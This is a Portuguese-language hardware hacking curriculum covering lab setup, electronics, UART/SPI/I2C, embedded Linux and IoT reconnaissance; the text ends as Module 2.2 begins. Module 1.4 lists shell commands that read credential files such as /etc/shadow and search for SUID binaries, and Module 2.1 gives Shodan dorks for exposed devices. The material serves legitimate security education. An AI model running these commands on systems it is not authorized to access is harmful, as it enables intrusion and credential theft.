# Roadmap: Hardware Hacking

> **Sobre este roadmap**: Cada módulo é uma sessão de **1h–3h** contendo teoria focada, memorização essencial, construção de intuição e um projeto prático simulável. A integração com IA é tratada como ferramenta de produtividade ao longo de todo o roadmap.
>
> **Conexões com os Roadmaps de Engenharia Elétrica**:
> Se você está seguindo os [roadmaps de EE](ee_roadmap_index.md) em paralelo, várias fases aqui aprofundam e aplicam conceitos de lá:
> - **Fase 0 (Setup)**: [Pilar 0](ee_matematica_fisica_roadmap.md) Mód 0.1 (sistemas numéricos), [Pilar 3](ee_digital_embarcados_roadmap.md) Mód 3.1 (binário/hex)
> - **Fase 1 (Fundamentos)**: [Pilar 1](ee_circuitos_roadmap.md) (Lei de Ohm, divisor de tensão), [Pilar 2](ee_eletronica_roadmap.md) Mód 2.5-2.7 (transistores), [Pilar 3](ee_digital_embarcados_roadmap.md) Mód 3.1-3.8 (lógica digital, FSMs), Mód 3.12 (UART/SPI/I2C)
> - **Fase 2 (Recon)**: [Lab L.2](ee_laboratorio_real_roadmap.md) (multímetro), [Lab L.10-L.12](ee_laboratorio_real_roadmap.md) (PCB — entender layout para analisar)
> - **Fase 3 (Serial)**: [Pilar 3](ee_digital_embarcados_roadmap.md) Mód 3.12 (UART/SPI/I2C teoria), [Lab L.7](ee_laboratorio_real_roadmap.md) (solda para acessar pads)
> - **Fase 6 (Wireless)**: [Pilar 2](ee_eletronica_roadmap.md) Mód 2.17-2.19 (RF, linhas de transmissão, EMC), [Pilar 0](ee_matematica_fisica_roadmap.md) Mód 0.34 (ondas EM)
> - **Fase 7 (Side-Channel)**: [Pilar 5](ee_controle_sinais_roadmap.md) Mód 5.3 (Fourier/FFT), Mód 5.13-5.16 (DSP), [Pilar 0](ee_matematica_fisica_roadmap.md) Mód 0.24-0.25 (probabilidade/estatística/SNR)
> - **Continuação**: [Roadmap Avançado](hardware_hacking_roadmap_avancado.md) (FPGA, silício, TEE, criptoanálise, OT/automotive)

---

## Visão Geral do Roadmap

| Fase | Módulos | Foco | Horas Est. |
|------|---------|------|-----------|
| **0 — Setup** | 0.1–0.4 | Ambiente, ferramentas, mindset, representações numéricas | ~6h |
| **1 — Fundamentos** | 1.1–1.6 | Eletrônica, protocolos, Linux embarcado | ~11h |
| **2 — Reconhecimento** | 2.1–2.4 | OSINT, PCB, datasheets, mapeamento | ~7h |
| **3 — Interfaces Seriais** | 3.1–3.5 | UART, SPI, I2C, U-Boot, prática | ~12h |
| **4 — Debug & JTAG** | 4.1–4.3 | JTAG, SWD, exploração | ~5.5h |
| **5 — Firmware** | 5.1–5.6 | Extração, análise, emulação, exploit, web IoT | ~14h |
| **6 — Wireless** | 6.1–6.3 | RF, BLE, Wi-Fi/Zigbee | ~6h |
| **7 — Ataques Avançados** | 7.1–7.4 | Side-channel, fault injection, glitching | ~8h |
| **8 — Integração & Projetos** | 8.1–8.3 | Projetos completos, CTFs, portfólio | ~8h |
| | | **Total estimado** | **~77h** |

### �️ Progressão Visual

```
Fase 0 (Setup)          Fase 1 (Fundamentos)        Fase 2 (Recon)
┌──────────────┐        ┌───────────────────┐       ┌──────────────┐
│ Lab + Python │───────▶│ Eletrônica + Proto│──────▶│ OSINT + PCB  │
│ + Números    │        │ colos + Linux      │       │ + Datasheets │
└──────────────┘        └───────────────────┘       └──────┬───────┘
                                                           │
                    ┌──────────────────────────────────────┘
                    ▼
Fase 3 (Serial)         Fase 4 (Debug)              Fase 5 (Firmware)
┌──────────────┐        ┌───────────────────┐       ┌──────────────────┐
│ UART/SPI/I2C │───────▶│ JTAG + SWD        │──────▶│ Extração + RE    │
│ + U-Boot     │        │ + Proteções       │       │ + Emulação + Web │
└──────────────┘        └───────────────────┘       └──────┬───────────┘
                                                           │
                    ┌──────────────────────────────────────┘
                    ▼
Fase 6 (Wireless)       Fase 7 (Avançado)           Fase 8 (Projetos)
┌──────────────┐        ┌───────────────────┐       ┌──────────────────┐
│ RF + BLE     │───────▶│ Side-channel +    │──────▶│ CTFs + Pentest   │
│ + Zigbee     │        │ Fault Injection   │       │ Completo         │
└──────────────┘        └───────────────────┘       └──────────────────┘
```

---

## 🛠️ Integração com IA — Guia Completo

> [!IMPORTANT]
> **IAs (ChatGPT, Claude, Gemini) são seus co-pilotos, não substitutos.** A IA erra em contextos de hardware (confunde pinouts, inventa registradores, alucina specs). Seu papel é **validar, direcionar e integrar**.

### Quando usar IA (e quando NÃO usar)

| ✅ Use IA para... | ❌ NÃO confie cegamente para... |
|---|---|
| Interpretar seções de datasheets | Pinouts exatos (sempre confira no datasheet original) |
| Gerar primeiro rascunho de scripts Python | Endereços de memória e registradores específicos |
| Explicar conceitos com analogias | Detalhes de timing críticos (nanossegundos importam) |
| Triagem inicial de superfícies de ataque | Garantia de que um exploit vai funcionar |
| Traduzir entre representações (hex ↔ bin ↔ dec) | Verificação final de segurança |

### 📋 Templates de Prompt para Hardware Hacking

Ao longo do roadmap, você verá sugestões de prompts. Aqui estão **templates reutilizáveis**:

```
🔍 ANÁLISE DE DATASHEET:
"Analise esta seção do datasheet do [chip]. Identifique:
1. Interfaces de debug disponíveis
2. Configurações de boot
3. Mecanismos de proteção
4. Potenciais pontos de ataque
Seção: [cole o trecho]"

🐛 TRIAGEM DE VULNERABILIDADE:
"Este dispositivo IoT usa [SoC], roda [OS], e expõe [interfaces].
O firmware foi extraído e encontrei: [achados].
Classifique as vulnerabilidades por criticidade e sugira PoCs."

🐍 GERAÇÃO DE SCRIPT:
"Escreva um script Python que [objetivo específico].
Requisitos: [libs permitidas]. Input: [formato]. Output: [formato].
Contexto: estou analisando firmware [arch] extraído via [método]."

📖 EXPLICAÇÃO CONCEITUAL:
"Explique [conceito] como se eu fosse um dev de software aprendendo
hardware hacking. Use analogias com programação. Depois, dê um
exemplo prático de como isso se aplica em um pentest de IoT."
```

### 🎚️ Calibração de Confiança na IA

Com o tempo, você vai calibrar seu nível de confiança na IA para cada tipo de tarefa:

| Tarefa | Confiança | Ação |
|--------|-----------|------|
| Explicar conceito genérico (ex: "o que é I2C") | Alta | Use direto, confira detalhes |
| Interpretar output de ferramenta (Binwalk, Nmap) | Alta | Use para acelerar, valide achados críticos |
| Gerar script de automação | Média | Revise antes de executar, teste com dados conhecidos |
| Identificar componentes em foto de PCB | Média | Use como hipótese inicial, confirme com datasheet |
| Pinout exato de um chip | Baixa | SEMPRE verifique no datasheet original |
| Timing/voltage exatos para glitching | Baixa | A IA pode dar o conceito, mas os valores precisam ser medidos |

---

## Fase 0 — Setup do Ambiente

### Módulo 0.1: Configuração do Lab Virtual
**Tempo: 1h–1.5h**

#### O que memorizar
- Arquitetura básica de VMs (hypervisor tipo 1 vs tipo 2)
- Comandos essenciais: `apt install`, `pip install`, `git clone`, `chmod +x`
- Estrutura de diretórios Linux: `/dev`, `/proc`, `/sys`, `/tmp`
- Como montar e desmontar partições/imagens de disco

#### Intuição
Seu lab virtual é como uma bancada de eletrônica digital. Tudo que você faria com osciloscópio e multímetro num hardware real, você vai simular com software. A VM isola seu ambiente — você pode quebrar tudo sem consequências. Pense na VM como seu "hardware descartável".

#### Projeto: "Bancada Digital"
1. Instale **VirtualBox** ou **VMware** no seu sistema host
2. Crie uma VM com **Kali Linux** (2GB RAM, 40GB disco)
3. Dentro do Kali, instale o toolkit de hardware hacking:
   ```bash
   sudo apt update && sudo apt install -y \
     binwalk firmware-mod-kit flashrom ghidra \
     gdb-multiarch qemu-system qemu-user-static \
     python3-pip radare2 minicom screen picocom \
     sigrok-cli pulseview logic wireshark
   pip3 install ubi_reader jefferson srecord pyserial
   ```
4. Clone repositórios de prática:
   ```bash
   git clone https://github.com/scriptingxss/EmbedOS
   git clone https://github.com/praetorian-inc/DVRF
   git clone https://github.com/attify/firmware-analysis-toolkit
   ```
5. Verifique que `binwalk --help`, `qemu-arm-static --version` e `ghidra` abrem corretamente
6. **Entregável**: Screenshot do terminal com todas as ferramentas instaladas e versões

---

### Módulo 0.2: Introdução ao Mindset de Hardware Hacking
**Tempo: 1h**

#### O que memorizar
- **Modelo de ameaça STRIDE** aplicado a dispositivos embarcados
- As 5 superfícies de ataque de hardware: física, interfaces de debug, firmware, comunicação wireless, supply chain
- Diferença entre **segurança por obscuridade** vs **segurança por design**
- Lei brasileira sobre pesquisa de segurança (Marco Civil da Internet, art. 154-A CP)

#### Intuição
Hardware hacking é engenharia reversa aplicada ao mundo físico. Enquanto um pentester web vê HTTP requests, você vê sinais elétricos, chips e trilhas na PCB. O "código-fonte" do hardware está nos datasheets, nos sinais nos barramentos, e no firmware gravado na flash. Sua vantagem: fabricantes frequentemente deixam interfaces de debug habilitadas, senhas hardcoded, e firmware sem criptografia — porque "ninguém vai abrir o dispositivo". Você vai.

#### Projeto: "Threat Model de um Roteador Doméstico"
1. Escolha um roteador popular (ex: TP-Link Archer C7, Xiaomi Mi Router)
2. Sem abrir o dispositivo, faça OSINT:
   - Busque o FCC ID no site [fcc.gov/oet/ea/fccid](https://www.fcc.gov/oet/ea/fccid) — encontre fotos internas
   - Identifique chipset principal (SoC), chip de flash, RAM
   - Baixe o firmware do site do fabricante
3. Use uma IA para analisar: *"Dado que este roteador usa SoC MediaTek MT7621 com flash SPI de 16MB, quais são as superfícies de ataque mais prováveis?"*
4. Documente um threat model simples em formato de tabela:

   | Superfície | Vetor de Ataque | Probabilidade | Impacto |
   |-----------|----------------|---------------|---------|
   | UART | Shell root via console serial | Alta | Crítico |
   | Firmware | Backdoor em binários | Média | Crítico |
   | Wi-Fi | WPS bruteforce | Média | Alto |

5. **Entregável**: Documento markdown com threat model + prints do FCC ID

---

### Módulo 0.3: Python para Hardware Hacking
**Tempo: 2h**

#### O que memorizar
- Manipulação de bytes: `struct.pack`, `struct.unpack`, `int.from_bytes`, `bytes.fromhex`
- Operações bitwise: `&`, `|`, `^`, `<<`, `>>` — e quando usar cada uma
- Biblioteca `serial` (pyserial) para comunicação serial
- Leitura/escrita de arquivos binários: `open('file', 'rb')`, `open('file', 'wb')`
- Formatação hexadecimal: `hex()`, `f'{val:08x}'`, `hexdump`

#### Intuição
Python é sua "solda digital". Assim como um ferro de solda conecta componentes físicos, Python conecta suas ferramentas e automatiza análises. No hardware hacking, você constantemente precisa: converter entre formatos (hex, binário, ASCII), manipular dumps de memória, automatizar comunicação serial, e processar saídas de ferramentas. Python faz tudo isso com poucas linhas.

#### Projeto: "Toolbox do Hardware Hacker"
1. Crie um script `hw_toolkit.py` com as seguintes funções:
   ```python
   def hex_dump(data, offset=0, width=16):
       """Exibe hex dump estilo xxd"""
       # Implementar saída formatada com offset, hex e ASCII

   def xor_decrypt(data, key):
       """XOR decrypt com chave de tamanho variável"""
       # Implementar XOR cíclico

   def find_strings(binary_path, min_length=4):
       """Extrai strings legíveis de um binário"""
       # Implementar extração de strings ASCII/UTF-8

   def checksum_crc32(data):
       """Calcula CRC32 de dados binários"""
       # Usar zlib.crc32

   def serial_interact(port, baud=115200):
       """Terminal serial interativo"""
       # Usar pyserial para abrir conexão
   ```
2. Teste cada função com um firmware de exemplo (baixe qualquer .bin de roteador)
3. Use IA para revisar seu código: *"Revise este script Python para hardware hacking, sugira melhorias de performance e segurança"*
4. **Entregável**: Script funcional + output de cada função testada com dados reais

---

### Módulo 0.4: Sistemas Numéricos, Endianness e Representação de Dados
**Tempo: 1.5h**

> [!NOTE]
> Se você já domina conversão hex/bin/dec e sabe a diferença entre big e little endian, pode fazer este módulo em modo revisão rápida (30 min). Mas **não pule** — erros de endianness e conversão são a fonte #1 de confusão em hardware hacking.

#### O que memorizar
- **Conversões na cabeça** (pratique até virar automático):
  - Binário → Hex: agrupe 4 bits = 1 hex digit (`1010 1111` = `0xAF`)
  - Hex → Decimal: `0xFF` = 255, `0x100` = 256, `0x1000` = 4096
  - Potências de 2: 2¹⁰ = 1024 (1K), 2²⁰ = 1M, 2³⁰ = 1G
- **Prefixos de tamanho**: byte (8 bits), word (16/32 bits dependendo da arch), dword (32 bits), qword (64 bits)
- **Endianness**:
  - **Big-endian (BE)**: byte mais significativo primeiro. `0x12345678` armazenado como `12 34 56 78`. Usado em protocolos de rede (TCP/IP)
  - **Little-endian (LE)**: byte menos significativo primeiro. `0x12345678` armazenado como `78 56 34 12`. Usado em x86, ARM (geralmente), MIPS (configurável)
  - **Dica mnemônica**: "Little-endian = Little end first" (o byte pequeno/final vem primeiro na memória)
- **Representações de string**: ASCII (7-bit, 0x41='A'), UTF-8 (compatível com ASCII), null-terminated (`\x00`)
- **Offsets e alinhamento**: endereços de memória são tipicamente alinhados em 4 bytes (32-bit) ou 8 bytes (64-bit)

#### Intuição
Tudo em hardware hacking se resume a **bytes**. Quando você faz um dump de flash, vê hex. Quando analisa um protocolo, vê bits. Quando lê um registrador, vê um endereço de memória. Se você não fluente em hex/bin/dec, cada análise vai ser como ler em uma língua estrangeira com dicionário — lento e frustrante.

**Endianness é especialmente traiçoeiro**: imagine que você faz dump de um endereço IP armazenado em firmware. Se o dispositivo é little-endian, o IP `192.168.1.1` (hex: `C0 A8 01 01`) pode aparecer como `01 01 A8 C0` na memória. Se você não souber disso, vai achar que o IP é `1.1.168.192`. Parece bobo, mas esse tipo de erro custa horas de debug.

#### Projeto: "Fluência em Hex"
1. **Exercícios de conversão rápida** (faça de cabeça, depois verifique):
   ```
   Binário → Hex:  10110011 = ?    11111111 = ?    00001010 = ?
   Hex → Decimal:  0x7F = ?        0xDEAD = ?      0xCAFE = ?
   Decimal → Hex:  255 = ?         1024 = ?        65535 = ?
   ```
2. **Exercício de endianness**: dado o valor 32-bit `0xDEADBEEF`:
   - Como fica em memória big-endian? E little-endian?
   - Se eu leio os bytes `EF BE AD DE` de um dump, qual é o valor original?
3. **Script Python de conversão**:
   ```python
   import struct
   
   valor = 0xDEADBEEF
   
   # Empacotar em big-endian e little-endian
   be = struct.pack('>I', valor)  # big-endian unsigned int
   le = struct.pack('<I', valor)  # little-endian unsigned int
   
   print(f"Valor: 0x{valor:08X}")
   print(f"Big-endian:    {be.hex(' ')}")
   print(f"Little-endian: {le.hex(' ')}")
   
   # Desempacotar: converter bytes de volta para inteiro
   dump_bytes = bytes.fromhex("EF BE AD DE")
   valor_le = struct.unpack('<I', dump_bytes)[0]
   valor_be = struct.unpack('>I', dump_bytes)[0]
   print(f"\nBytes: {dump_bytes.hex(' ')}")
   print(f"Interpretado como LE: 0x{valor_le:08X}")
   print(f"Interpretado como BE: 0x{valor_be:08X}")
   ```
4. **Exercício de hex dump real**: baixe qualquer firmware de roteador e examine os primeiros 256 bytes com `xxd firmware.bin | head -16`. Identifique:
   - Magic bytes (ex: `27 05 19 56` = header U-Boot)
   - Strings ASCII legíveis
   - Endereços em little-endian vs big-endian
5. **Entregável**: Exercícios resolvidos + script funcional + análise de hex dump real

#### Erros Comuns
- Confundir endianness ao ler endereços de memória em dumps
- Esquecer que `0x10` = 16 (decimal), não 10
- Achar que "word" é sempre 16 bits (depende da arquitetura!)
- Não perceber que strings em firmware podem ser UTF-8, UTF-16LE, ou até encoding proprietário

#### Checkpoint
Antes de ir para a Fase 1, você deve conseguir:
- [ ] Converter hex ↔ bin ↔ dec de cabeça em menos de 5 segundos
- [ ] Olhar um hex dump e identificar strings, endereços, e magic bytes
- [ ] Explicar endianness para alguém que nunca ouviu o termo
- [ ] Usar `struct.pack/unpack` em Python sem consultar documentação

---

## Fase 1 — Fundamentos de Eletrônica e Sistemas Embarcados

### Módulo 1.1: Eletrônica Digital Essencial
**Tempo: 2h**

#### O que memorizar
- **Tensões padrão**: 1.8V, 3.3V, 5V — e por que importam (level shifting, dano a componentes)
- **Lei de Ohm**: V = I × R — calcular corrente para não queimar componentes
- **Pull-up / Pull-down resistors**: mantêm pinos em estado definido (HIGH/LOW)
- **Níveis lógicos TTL vs CMOS**: TTL (0-0.8V = LOW, 2-5V = HIGH), CMOS (0-1/3 Vcc = LOW, 2/3 Vcc-Vcc = HIGH)
- **Capacitores de desacoplamento**: por que todo chip tem caps de 100nF perto dos pinos de alimentação

#### Intuição
Pense nos sinais digitais como linguagem. 0V = silêncio, 3.3V = alguém falando. Pull-ups são como o "volume padrão" — sem eles, o pino fica flutuando entre falar e não falar (estado indeterminado). Quando você conecta seu analisador lógico ou UART adapter, você está "ouvindo" essa conversa entre chips. Se você conectar um dispositivo de 5V num chip de 3.3V sem level shifting, é como gritar no ouvido de alguém — você pode causar dano permanente.

#### Projeto: "Simulador de Circuito Digital"
1. Acesse [Falstad Circuit Simulator](https://www.falstad.com/circuit/) ou [Wokwi](https://wokwi.com/)
2. Simule os seguintes circuitos:
   - **Divisor de tensão** 5V → 3.3V (para level shifting básico)
   - **Pull-up resistor** 10kΩ em um botão — observe o estado do pino com e sem pull-up
   - **LED com resistor limitador** — calcule R para LED vermelho (Vf=2V) em 3.3V com 20mA
3. No Wokwi, programe um **Arduino** para:
   - Ler um botão com pull-up interno (`INPUT_PULLUP`)
   - Controlar um LED via PWM
   - Comunicar via Serial a 115200 baud
4. Documente os cálculos e capturas de tela da simulação
5. **Prompt IA**: *"Explique por que um resistor de pull-up de 10kΩ é padrão e quando usar valores diferentes"*
6. **Entregável**: Capturas de tela dos circuitos simulados + cálculos documentados

#### Erros Comuns
- Conectar dispositivo de 5V diretamente em chip de 3.3V (pode queimar permanentemente!)
- Esquecer de conectar GND entre dispositivos (referência comum é obrigatória)
- Confundir **tensão** (Volts, diferença de potencial) com **corrente** (Amperes, fluxo de elétrons)
- Usar pull-up de valor muito alto (1MΩ) ou muito baixo (100Ω) — 4.7kΩ a 10kΩ é o sweet spot

---

### Módulo 1.2: Arquitetura de Sistemas Embarcados
**Tempo: 2h**

#### O que memorizar
- **Componentes de um SoC**: CPU (ARM Cortex-A/M/R), ROM de boot, SRAM, controladores de periféricos
- **Mapa de memória**: como a CPU vê ROM, RAM, periféricos (memory-mapped I/O)
- **Boot sequence**: ROM → Bootloader (U-Boot) → Kernel → Userspace
- **Tipos de memória**: NOR Flash (XIP), NAND Flash (boot via bootloader), eMMC, EEPROM
- **Arquiteturas comuns**: ARM (Cortex-M para MCU, Cortex-A para aplicações), MIPS (roteadores), RISC-V

#### Intuição
Um sistema embarcado é como um computador miniaturizado com propósito específico. O SoC é o "cérebro" — contém CPU, memória e periféricos num único chip. A flash é o "disco rígido" — guarda o firmware. A RAM é a "mesa de trabalho" — dados temporários. O bootloader é o "BIOS" — inicializa tudo. Quando você hackeia hardware, está atacando algum ponto dessa cadeia: interrompendo o boot, extraindo a flash, ou se conectando às interfaces que a CPU usa para falar com periféricos.

#### Projeto: "Mapeamento de Arquitetura"
1. Baixe o datasheet de um SoC comum: **ESP32** (Espressif) ou **STM32F103** (ST)
2. Use IA para interpretar o datasheet: *"Resuma a arquitetura deste SoC, identificando CPU, memória, periféricos e interfaces de debug disponíveis"*
3. Desenhe o **diagrama de blocos** do SoC no draw.io ou no papel, incluindo:
   - CPU e barramento principal
   - Flash interna e/ou controlador de flash externo
   - Periféricos: UART, SPI, I2C, GPIO, ADC
   - Interface de debug (JTAG/SWD)
4. Mapeie o **mapa de memória** do SoC:
   - Onde começa/termina a Flash? E a SRAM? E os registradores de periféricos?
5. Identifique o **boot sequence** documentado
6. **Entregável**: Diagrama de blocos + mapa de memória + boot sequence documentados

---

### Módulo 1.3: Protocolos de Comunicação Serial — Teoria
**Tempo: 1.5h**

#### O que memorizar
- **UART**: Assíncrono, 2 fios (TX/RX), baud rates comuns (9600, 19200, 38400, 57600, 115200), 8N1 (8 data bits, no parity, 1 stop bit)
- **SPI**: Síncrono, 4 fios (MOSI, MISO, SCLK, CS), full-duplex, master/slave, modos 0-3 (CPOL/CPHA)
- **I2C**: Síncrono, 2 fios (SDA, SCL), half-duplex, endereçamento 7-bit (128 devices), ACK/NACK
- **Diferenças-chave**: UART = sem clock, SPI = mais rápido mas mais fios, I2C = menos fios mas mais lento

#### Intuição
Pense nos protocolos como idiomas entre chips:
- **UART** é como walkie-talkie — dois dispositivos falam diretamente, mas precisam concordar na velocidade (baud rate) antes
- **SPI** é como uma aula — o professor (master) controla quem fala (CS) e marca o ritmo (clock), alunos respondem um por vez
- **I2C** é como um ônibus com passageiros — todos compartilham dois fios, cada passageiro tem um número (endereço), e o motorista (master) chama cada um pelo número

No hardware hacking, **UART é seu melhor amigo** — muitos dispositivos expõem consoles de debug via UART com acesso root. SPI é como você lê/escreve chips de flash. I2C dá acesso a sensores e EEPROMs com dados de configuração.

#### Projeto: "Decodificador de Protocolos"
1. Baixe captures de sinais de exemplo:
   - Acesse [Saleae Logic Analyzer Demos](https://support.saleae.com/protocol-analyzers/analyzer-user-guides)
   - Ou use dados do [sigrok sample repository](https://sigrok.org/wiki/Downloads#Sample_captures)
2. Abra no **PulseView** (parte do Sigrok) ou analise visualmente
3. Para cada protocolo, identifique manualmente:
   - **UART**: Encontre o start bit (transição HIGH→LOW), conte os data bits, identifique o baud rate pela duração do bit
   - **SPI**: Identifique SCLK, MOSI, MISO, CS — decodifique os bytes transmitidos
   - **I2C**: Identifique START condition (SDA cai enquanto SCL HIGH), endereço, R/W bit, ACK
4. Use o decodificador automático do PulseView para verificar suas respostas
5. **Prompt IA**: *"Tenho um sinal UART com bit duration de 8.68µs. Qual é o baud rate? Explique o cálculo."* (Resposta: 1/8.68µs ≈ 115200 baud)
6. **Entregável**: Screenshots das decodificações manuais vs automáticas + cálculo de baud rate

---

### Módulo 1.4: Linux para Sistemas Embarcados
**Tempo: 2h**

#### O que memorizar
- **Filesystem Hierarchy**: `/bin`, `/sbin`, `/etc`, `/dev`, `/proc`, `/sys`, `/tmp`, `/var`
- **BusyBox**: um único binário que implementa centenas de comandos Unix (ls, cat, sh, wget, etc.)
- **Init systems**: SysV init (`/etc/init.d/`), systemd, OpenRC — e como serviços são iniciados
- **Comandos de recon essenciais**:
  ```
  cat /etc/passwd        # usuários do sistema
  cat /etc/shadow        # hashes de senha (se acessível)
  uname -a               # versão do kernel
  ps aux                 # processos rodando
  netstat -tlnp          # portas abertas
  find / -perm -4000     # binários SUID
  cat /proc/mtd          # partições MTD (flash)
  cat /proc/cmdline      # argumentos do kernel no boot
  ```

#### Intuição
A maioria dos dispositivos IoT roda Linux embarcado — uma versão enxuta com BusyBox. Quando você obtém um shell (via UART, exploit, ou emulação), os primeiros 60 segundos são críticos: você precisa rapidamente entender onde está, que processos rodam, que serviços escutam, e onde estão os dados sensíveis. É como entrar em um prédio desconhecido — você precisa do mapa (filesystem), da lista de moradores (processos), e das portas abertas (serviços de rede).

#### Projeto: "Exploração de Filesystem Embarcado"
1. Baixe um firmware de roteador OpenWrt: [downloads.openwrt.org](https://downloads.openwrt.org/)
2. Extraia o filesystem com Binwalk:
   ```bash
   binwalk -e openwrt-*.bin
   cd _openwrt-*.bin.extracted/
   ls -la squashfs-root/
   ```
3. Explore o filesystem extraído como se fosse um shell real:
   - Identifique todos os usuários (`cat etc/passwd`)
   - Encontre arquivos de configuração sensíveis (`find . -name "*.conf" -o -name "*.cfg"`)
   - Localize binários SUID (`find . -perm -4000`)
   - Identifique serviços que iniciam no boot (`ls etc/init.d/`)
   - Procure senhas/chaves hardcoded (`grep -r "password\|passw\|secret\|key" etc/`)
4. Documente tudo que encontrou de interessante
5. **Prompt IA**: *"Encontrei estes arquivos num firmware de roteador: [lista]. Quais são os mais interessantes do ponto de vista de segurança e por quê?"*
6. **Entregável**: Relatório de recon do filesystem com achados categorizados

---

### Módulo 1.5: Introdução a Datasheets com Auxílio de IA
**Tempo: 1.5h**

#### O que memorizar
- **Estrutura típica de datasheet**: Features → Pinout → Block Diagram → Electrical Characteristics → Registers → Timing Diagrams → Package
- **Seções críticas para hacking**: Pinout (identificar UART/JTAG), Memory Map, Boot Configuration, Debug Interface
- **Como ler timing diagrams**: eixo X = tempo, eixo Y = nível lógico, setas = relações causais
- **Parâmetros elétricos essenciais**: VCC (alimentação), VIH/VIL (nível lógico), IOH/IOL (corrente de saída), velocidade máxima de clock

#### Intuição
Um datasheet é o "manual de instruções" completo de um chip — escrito por engenheiros, para engenheiros. É denso, técnico, e frequentemente 500+ páginas. **Você NÃO precisa ler tudo.** Precisa saber **onde procurar**. É como um dicionário: você não lê de A a Z, você busca a palavra que precisa. Para hardware hacking, as "palavras" que você busca são: debug interface, UART pins, JTAG pins, boot mode, flash memory interface. **IA é excelente para navegar datasheets** — cole seções e peça resumos.

#### Projeto: "Datasheet Speed-Run"
1. Baixe o datasheet do **Winbond W25Q128** (chip de flash SPI extremamente comum)
2. Em 20 minutos, sem ajuda de IA, encontre:
   - Tensão de operação
   - Pinout completo (8 pinos — qual é qual?)
   - Comandos SPI para leitura (Read Data: `0x03`)
   - Capacidade total e organização da memória
   - Tempo máximo para apagar um setor (sector erase time)
3. Agora use IA: copie a seção de comandos SPI e peça: *"Explique a sequência completa de comandos SPI para ler os primeiros 256 bytes deste chip de flash, incluindo o Write Enable e o status register"*
4. Compare o tempo que levou sozinho vs com IA
5. Repita com o datasheet de um SoC mais complexo (ex: **Realtek RTL8196E**, comum em roteadores brasileiros)
6. **Entregável**: Tabela resumo dos dados extraídos + tempo com/sem IA + relatório de aprendizado

---

### Módulo 1.6: Solda e Manipulação Física (Simulado)
**Tempo: 1.5h**

#### O que memorizar
- **Tipos de solda**: through-hole (fácil, fios em furos) vs SMD (miniaturizado, precisa precisão)
- **Equipamento mínimo**: ferro de solda com controle de temperatura (320-370°C), estanho 63/37, flux, malha dessoldadora
- **Boas práticas**: limpar ponta, estanhar antes de soldar, aquecer o pad + componente (não só a solda), ESD protection
- **Conexão a test pads/points**: como soldar fios finos em pads SMD para acessar UART/JTAG
- **Identificação visual de componentes**: resistores SMD (código de 3/4 dígitos), capacitores, CIs (número de part no topo)

#### Intuição
Solda é a habilidade "física" do hardware hacking. Sem ela, você não consegue se conectar a test points na PCB, extrair chips de flash, ou modificar circuitos. É como aprender a dirigir — parece difícil no começo, mas com prática vira automático. A boa notícia: para hardware hacking, você geralmente só precisa de solda básica — conectar fios a pontos de teste expostos. Não precisa ser um artesão de SMD 0201.

#### Projeto: "Prática de Solda Virtual + Planejamento"
1. Assista ao vídeo [EEVblog #180 - Soldering Tutorial](https://www.youtube.com/watch?v=J5Sb21qbpEQ) (ou equivalente em PT-BR)
2. No simulador [Wokwi](https://wokwi.com/), monte um circuito com:
   - Arduino Nano + sensor de temperatura (simulando uma PCB de dispositivo IoT)
   - Fios conectando pinos específicos (simulando soldas a test points)
3. Pesquise fotos de PCBs reais com test points de UART marcados:
   - Busque no Google: `"UART test points" site:openwrt.org` ou `"UART pinout" [modelo de roteador]`
   - Identifique visualmente: GND, TX, RX, VCC
4. Crie uma **lista de compras** para seu kit de hardware hacking inicial (com preços do AliExpress/Mercado Livre):
   - USB-UART adapter (CP2102 ou CH340) — ~R$15
   - Logic analyzer (clone Saleae 8ch) — ~R$30
   - Bus Pirate v3.6 — ~R$80
   - Ferro de solda TS100/Pinecil — ~R$150
   - Jumper wires, breadboard — ~R$20
   - SOP8 clip (para conectar em chips flash sem dessoldar) — ~R$15
   - CH341A flash programmer — ~R$20
5. **Entregável**: Lista de compras priorizada + screenshots de PCBs com UART identificados

---

#### Checkpoint — Fim da Fase 1
Antes de partir para reconhecimento, valide:
- [ ] Entende Lei de Ohm e sabe calcular resistor limitador para LED
- [ ] Sabe a diferença entre UART, SPI e I2C (com analogias próprias)
- [ ] Consegue navegar um filesystem Linux embarcado e encontrar informações sensíveis
- [ ] Sabe localizar informações-chave num datasheet em menos de 5 minutos
- [ ] Montou sua lista de compras de hardware (e entende para que serve cada item)

---

## Fase 2 — Reconhecimento e Análise de PCB

### Módulo 2.1: OSINT para Dispositivos IoT
**Tempo: 1.5h**

#### O que memorizar
- **Fontes de OSINT**: FCC ID (fotos internas), WikiDevi (specs de roteadores), OpenWrt Table of Hardware, exploit-db
- **Shodan/Censys**: busca por dispositivos expostos na internet; dorks: `port:23 "login"`, `http.title:"router"`
- **CVE databases**: NVD, Exploit-DB, VulnHub — buscar por modelo/chipset
- **Repositórios de firmware**: sites de fabricantes, archive.org, repositórios de firmware comunitários
- **Google dorking**: `inurl:firmware filetype:bin site:tp-link.com`

#### Intuição
Antes de tocar no hardware, você já pode descobrir MUITO sobre o alvo. OSINT é seu reconhecimento — como um assaltante que estuda o prédio por semanas antes de entrar. As fotos do FCC ID mostram a PCB completa, com chips legíveis. O WikiDevi te dá o chipset exato. O firmware público te dá o código que roda no dispositivo. Você pode montar 80% do seu plano de ataque sem comprar ou abrir nada.

#### Projeto: "Dossiê de Alvo"
1. Escolha 3 dispositivos IoT populares no Brasil (ex: roteador Intelbras, câmera Hikvision, smart plug Positivo)
2. Para cada dispositivo, colete:
   - FCC ID → fotos internas da PCB
   - Chipset principal (SoC), memória flash, RAM
   - Firmware disponível para download
   - CVEs conhecidos
   - Posts em fóruns de hacking/OpenWrt sobre o dispositivo
3. Use IA para análise: *"Baseado nestes chipsets e componentes, qual dispositivo tem a maior superfície de ataque e por quê?"*
4. Classifique os 3 alvos por "hackabilidade" (facilidade de exploração)
5. **Entregável**: Dossiê completo de cada dispositivo em formato markdown com links e screenshots

---

### Módulo 2.2: Análise Visual de PCB
**Tempo: 2h**

#### O que memorizar
- **Identificação de componentes por encapsulamento**: QFP, BGA, SOIC, SOT-23, 0805/0603
- **Leitura de part numbers**: os números no topo dos CIs identificam o chip exato — busque no Google/Octopart
- **Test points comuns**: pads rotulados TP1, TP2... ou J1, J2... (headers) — frequentemente UART ou JTAG
- **Padrões de 4 pinos**: em linha = provavelmente UART (GND, RX, TX, VCC)
- **Padrões de 10/20 pinos**: provavelmente JTAG (ARM standard)
- **Trilhas na PCB**: seguir trilhas de test points até chips pode revelar função

#### Intuição
